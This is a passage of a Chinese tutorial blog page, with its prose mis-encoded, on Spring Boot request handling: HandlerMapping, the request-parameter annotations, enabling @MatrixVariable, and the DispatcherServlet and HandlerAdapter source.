å°„ã€‚/xxx-&gt;&gt;xxxx</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getHandler()</code>æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.handlerMappings</code>åœ¨Debugæ¨¡å¼ä¸‹å±•ç°çš„å†…å®¹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005802305.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶ä¸­ï¼Œä¿å­˜äº†æ‰€æœ‰<code>@RequestMapping</code> å’Œ<code>handler</code>çš„æ˜ å°„è§„åˆ™ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005926474.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€æœ‰çš„è¯·æ±‚æ˜ å°„éƒ½åœ¨HandlerMappingä¸­ï¼š</p><ul><li><p>SpringBootè‡ªåŠ¨é…ç½®æ¬¢è¿é¡µçš„ WelcomePageHandlerMapping ã€‚è®¿é—® &#x2F;èƒ½è®¿é—®åˆ°index.htmlï¼›</p></li><li><p>SpringBootè‡ªåŠ¨é…ç½®äº†é»˜è®¤ çš„ RequestMappingHandlerMapping</p></li><li><p>è¯·æ±‚è¿›æ¥ï¼ŒæŒ¨ä¸ªå°è¯•æ‰€æœ‰çš„HandlerMappingçœ‹æ˜¯å¦æœ‰è¯·æ±‚ä¿¡æ¯ã€‚</p><ul><li>å¦‚æœæœ‰å°±æ‰¾åˆ°è¿™ä¸ªè¯·æ±‚å¯¹åº”çš„handler</li><li>å¦‚æœæ²¡æœ‰å°±æ˜¯ä¸‹ä¸€ä¸ª HandlerMapping</li></ul></li><li><p>æˆ‘ä»¬éœ€è¦ä¸€äº›è‡ªå®šä¹‰çš„æ˜ å°„å¤„ç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±ç»™å®¹å™¨ä¸­æ”¾<strong>HandlerMapping</strong>ã€‚è‡ªå®šä¹‰ <strong>HandlerMapping</strong></p></li></ul><hr><p>IDEAå¿«æ·é”®ï¼š</p><ul><li>Ctrl + Alt + U : ä»¥UMLçš„ç±»å›¾å±•ç°ç±»æœ‰å“ªäº›ç»§æ‰¿ç±»ï¼Œæ´¾ç”Ÿç±»ä»¥åŠå®ç°å“ªäº›æ¥å£ã€‚</li><li>Crtl + Alt + Shift + U : åŒä¸Šï¼ŒåŒºåˆ«åœ¨äºä¸Šæ¡å¿«æ·é”®ç»“æœåœ¨æ–°é¡µå±•ç°ï¼Œè€Œæœ¬æ¡å¿«æ·é”®ç»“æœåœ¨å¼¹çª—å±•ç°ã€‚</li><li>Ctrl + H : ä»¥æ ‘å½¢æ–¹å¼å±•ç°ç±»å±‚æ¬¡ç»“æ„å›¾ã€‚</li></ul><h2 id="29ã€è¯·æ±‚å¤„ç†-å¸¸ç”¨å‚æ•°æ³¨è§£ä½¿ç”¨"><a href="#29ã€è¯·æ±‚å¤„ç†-å¸¸ç”¨å‚æ•°æ³¨è§£ä½¿ç”¨" class="headerlink" title="29ã€è¯·æ±‚å¤„ç†-å¸¸ç”¨å‚æ•°æ³¨è§£ä½¿ç”¨"></a>29ã€è¯·æ±‚å¤„ç†-å¸¸ç”¨å‚æ•°æ³¨è§£ä½¿ç”¨</h2><p>æ³¨è§£ï¼š</p><ul><li><code>@PathVariable</code> è·¯å¾„å˜é‡</li><li><code>@RequestHeader</code> è·å–è¯·æ±‚å¤´</li><li><code>@RequestParam</code> è·å–è¯·æ±‚å‚æ•°ï¼ˆæŒ‡é—®å·åçš„å‚æ•°ï¼Œurl?a&#x3D;1&amp;b&#x3D;2ï¼‰</li><li><code>@CookieValue</code> è·å–Cookieå€¼</li><li><code>@RequestAttribute</code> è·å–requeståŸŸå±æ€§</li><li><code>@RequestBody</code> è·å–è¯·æ±‚ä½“[POST]</li><li><code>@MatrixVariable</code> çŸ©é˜µå˜é‡</li><li><code>@ModelAttribute</code></li></ul><p>ä½¿ç”¨ç”¨ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterTestController</span> &#123;<br><br><br>    <span class="hljs-comment">//  car/2/owner/zhangsan</span><br>    <span class="hljs-meta">@GetMapping(&quot;/car/&#123;id&#125;/owner/&#123;username&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String,Object&gt; <span class="hljs-title function_">getCar</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@PathVariable(&quot;username&quot;)</span> String name,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@PathVariable</span> Map&lt;String,String&gt; pv,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestHeader(&quot;User-Agent&quot;)</span> String userAgent,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestHeader</span> Map&lt;String,String&gt; header,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestParam(&quot;age&quot;)</span> Integer age,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestParam(&quot;inters&quot;)</span> List&lt;String&gt; inters,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@RequestParam</span> Map&lt;String,String&gt; params,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@CookieValue(&quot;_ga&quot;)</span> String _ga,</span><br><span class="hljs-params">                                     <span class="hljs-meta">@CookieValue(&quot;_ga&quot;)</span> Cookie cookie)</span>&#123;<br><br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br><span class="hljs-comment">//        map.put(&quot;id&quot;,id);</span><br><span class="hljs-comment">//        map.put(&quot;name&quot;,name);</span><br><span class="hljs-comment">//        map.put(&quot;pv&quot;,pv);</span><br><span class="hljs-comment">//        map.put(&quot;userAgent&quot;,userAgent);</span><br><span class="hljs-comment">//        map.put(&quot;headers&quot;,header);</span><br>        map.put(<span class="hljs-string">&quot;age&quot;</span>,age);<br>        map.put(<span class="hljs-string">&quot;inters&quot;</span>,inters);<br>        map.put(<span class="hljs-string">&quot;params&quot;</span>,params);<br>        map.put(<span class="hljs-string">&quot;_ga&quot;</span>,_ga);<br>        System.out.println(cookie.getName()+<span class="hljs-string">&quot;===&gt;&quot;</span>+cookie.getValue());<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br><br>    <span class="hljs-meta">@PostMapping(&quot;/save&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">postMethod</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String content)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;content&quot;</span>,content);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="30ã€è¯·æ±‚å¤„ç†-RequestAttribute"><a href="#30ã€è¯·æ±‚å¤„ç†-RequestAttribute" class="headerlink" title="30ã€è¯·æ±‚å¤„ç†-@RequestAttribute"></a>30ã€è¯·æ±‚å¤„ç†-@RequestAttribute</h2><p>ç”¨ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/goto&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goToPage</span><span class="hljs-params">(HttpServletRequest request)</span>&#123;<br><br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;æˆåŠŸäº†...&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-number">200</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;  <span class="hljs-comment">//è½¬å‘åˆ°  /successè¯·æ±‚</span><br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/params&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testParam</span><span class="hljs-params">(Map&lt;String,Object&gt; map,</span><br><span class="hljs-params">                            Model model,</span><br><span class="hljs-params">                            HttpServletRequest request,</span><br><span class="hljs-params">                            HttpServletResponse response)</span>&#123;<br>        map.put(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world666&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-string">&quot;hello666&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>,<span class="hljs-string">&quot;HelloWorld&quot;</span>);<br><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;c1&quot;</span>,<span class="hljs-string">&quot;v1&quot;</span>);<br>        response.addCookie(cookie);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">///&lt;-----------------ä¸»è§’@RequestAttributeåœ¨è¿™ä¸ªæ–¹æ³•</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@GetMapping(&quot;/success&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-meta">@RequestAttribute(value = &quot;msg&quot;,required = false)</span> String msg,</span><br><span class="hljs-params">                       <span class="hljs-meta">@RequestAttribute(value = &quot;code&quot;,required = false)</span>Integer code,</span><br><span class="hljs-params">                       HttpServletRequest request)</span>&#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">msg1</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br><br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">world</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;world&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;message&quot;</span>);<br><br>        map.put(<span class="hljs-string">&quot;reqMethod_msg&quot;</span>,msg1);<br>        map.put(<span class="hljs-string">&quot;annotation_msg&quot;</span>,msg);<br>        map.put(<span class="hljs-string">&quot;hello&quot;</span>,hello);<br>        map.put(<span class="hljs-string">&quot;world&quot;</span>,world);<br>        map.put(<span class="hljs-string">&quot;message&quot;</span>,message);<br><br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="31ã€è¯·æ±‚å¤„ç†-MatrixVariableä¸UrlPathHelper"><a href="#31ã€è¯·æ±‚å¤„ç†-MatrixVariableä¸UrlPathHelper" class="headerlink" title="31ã€è¯·æ±‚å¤„ç†-@MatrixVariableä¸UrlPathHelper"></a>31ã€è¯·æ±‚å¤„ç†-@MatrixVariableä¸UrlPathHelper</h2><ol><li><p>è¯­æ³•ï¼š è¯·æ±‚è·¯å¾„ï¼š<code>/cars/sell;low=34;brand=byd,audi,yd</code></p></li><li><p>SpringBooté»˜è®¤æ˜¯ç¦ç”¨äº†çŸ©é˜µå˜é‡çš„åŠŸèƒ½</p><ul><li>æ‰‹åŠ¨å¼€å¯ï¼šåŸç†ã€‚å¯¹äºè·¯å¾„çš„å¤„ç†ã€‚UrlPathHelperçš„removeSemicolonContentè®¾ç½®ä¸ºfalseï¼Œè®©å…¶æ”¯æŒçŸ©é˜µå˜é‡çš„ã€‚</li></ul></li><li><p>çŸ©é˜µå˜é‡<strong>å¿…é¡»</strong>æœ‰urlè·¯å¾„å˜é‡æ‰èƒ½è¢«è§£æ</p></li></ol><p><strong>æ‰‹åŠ¨å¼€å¯çŸ©é˜µå˜é‡</strong>ï¼š</p><ul><li>å®ç°<code>WebMvcConfigurer</code>æ¥å£ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> &#123;<br><br>        <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();<br>        <span class="hljs-comment">// ä¸ç§»é™¤ï¼›åé¢çš„å†…å®¹ã€‚çŸ©é˜µå˜é‡åŠŸèƒ½å°±å¯ä»¥ç”Ÿæ•ˆ</span><br>        urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>);<br>        configurer.setUrlPathHelper(urlPathHelper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºè¿”å›<code>WebMvcConfigurer</code>Beanï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span>&#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br>                        <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> &#123;<br>                <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();<br>                <span class="hljs-comment">// ä¸ç§»é™¤ï¼›åé¢çš„å†…å®¹ã€‚çŸ©é˜µå˜é‡åŠŸèƒ½å°±å¯ä»¥ç”Ÿæ•ˆ</span><br>                urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>);<br>                configurer.setUrlPathHelper(urlPathHelper);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>@MatrixVariable</code>çš„ç”¨ä¾‹</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterTestController</span> &#123;<br><br>    <span class="hljs-comment">///cars/sell;low=34;brand=byd,audi,yd</span><br>    <span class="hljs-meta">@GetMapping(&quot;/cars/&#123;path&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">carsSell</span><span class="hljs-params">(<span class="hljs-meta">@MatrixVariable(&quot;low&quot;)</span> Integer low,</span><br><span class="hljs-params">                        <span class="hljs-meta">@MatrixVariable(&quot;brand&quot;)</span> List&lt;String&gt; brand,</span><br><span class="hljs-params">                        <span class="hljs-meta">@PathVariable(&quot;path&quot;)</span> String path)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        map.put(<span class="hljs-string">&quot;low&quot;</span>,low);<br>        map.put(<span class="hljs-string">&quot;brand&quot;</span>,brand);<br>        map.put(<span class="hljs-string">&quot;path&quot;</span>,path);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-comment">// /boss/1;age=20/2;age=10</span><br><br>    <span class="hljs-meta">@GetMapping(&quot;/boss/&#123;bossId&#125;/&#123;empId&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">boss</span><span class="hljs-params">(<span class="hljs-meta">@MatrixVariable(value = &quot;age&quot;,pathVar = &quot;bossId&quot;)</span> Integer bossAge,</span><br><span class="hljs-params">                    <span class="hljs-meta">@MatrixVariable(value = &quot;age&quot;,pathVar = &quot;empId&quot;)</span> Integer empAge)</span>&#123;<br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        map.put(<span class="hljs-string">&quot;bossAge&quot;</span>,bossAge);<br>        map.put(<span class="hljs-string">&quot;empAge&quot;</span>,empAge);<br>        <span class="hljs-keyword">return</span> map;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="32ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-å„ç§ç±»å‹å‚æ•°è§£æåŸç†"><a href="#32ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-å„ç§ç±»å‹å‚æ•°è§£æåŸç†" class="headerlink" title="32ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-å„ç§ç±»å‹å‚æ•°è§£æåŸç†"></a>32ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-å„ç§ç±»å‹å‚æ•°è§£æåŸç†</h2><p>è¿™è¦ä»<code>DispatcherServlet</code>å¼€å§‹è¯´èµ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>        <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                processedRequest = checkMultipart(request);<br>                multipartRequestParsed = (processedRequest != request);<br><br>                <span class="hljs-comment">// Determine handler for the current request.</span><br>                mappedHandler = getHandler(processedRequest);<br>                <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>                    noHandlerFound(processedRequest, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// Determine handler adapter for the current request.</span><br>                <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br>                ...<br></code></pre></td></tr></table></figure><ul><li><code>HandlerMapping</code>ä¸­æ‰¾åˆ°èƒ½å¤„ç†è¯·æ±‚çš„<code>Handler</code>ï¼ˆController.method()ï¼‰ã€‚</li><li>ä¸ºå½“å‰Handler æ‰¾ä¸€ä¸ªé€‚é…å™¨ <code>HandlerAdapter</code>ï¼Œç”¨çš„æœ€å¤šçš„æ˜¯<strong>RequestMappingHandlerAdapter</strong>ã€‚</li><li>é€‚é…å™¨æ‰§è¡Œç›®æ ‡æ–¹æ³•å¹¶ç¡®å®šæ–¹æ³•å‚æ•°çš„æ¯ä¸€ä¸ªå€¼ã€‚</li></ul><h3 id="HandlerAdapter"><a href="#HandlerAdapter" class="headerlink" title="HandlerAdapter"></a>HandlerAdapter</h3><p>é»˜è®¤ä¼šåŠ è½½æ‰€æœ‰<code>HandlerAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br><br>    <span class="hljs-comment">/** Detect all HandlerAdapters or just expect &quot;handlerAdapter&quot; bean?. */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">detectAllHandlerAdapters</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><br>    ...<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.detectAllHandlerAdapters) &#123;<br>            <span class="hljs-comment">// Find all HandlerAdapters in the ApplicationContext, including ancestor contexts.</span><br>            Map&lt;String, HandlerAdapter&gt; matchingBeans =<br>                BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerAdapter.class, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">if</span> (!matchingBeans.isEmpty()) &#123;<br>                <span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(matchingBeans.values());<br>                <span class="hljs-comment">// We keep HandlerAdapters in sorted order.</span><br>                AnnotationAwareOrderComparator.sort(<span class="hljs-built_in">this</span>.handlerAdapters);<br>            &#125;<br>        &#125;<br>     ...<br></code></pre></td></tr></table></figure><p>æœ‰è¿™äº›<code>HandlerAdapter</code>ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010047654.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol start="0"><li><p>æ”¯æŒæ–¹æ³•ä¸Šæ ‡æ³¨<code>@RequestMapping</code> </p></li><li><p>æ”¯æŒå‡½æ•°å¼ç¼–ç¨‹çš„</p></li><li><p>â€¦</p></li><li><p>â€¦</p></li></ol><h3 id="æ‰§è¡Œç›®æ ‡æ–¹æ³•"><a href="#æ‰§è¡Œç›®æ ‡æ–¹æ³•" class="headerlink" title="æ‰§è¡Œç›®æ ‡æ–¹æ³•"></a>æ‰§è¡Œç›®æ ‡æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 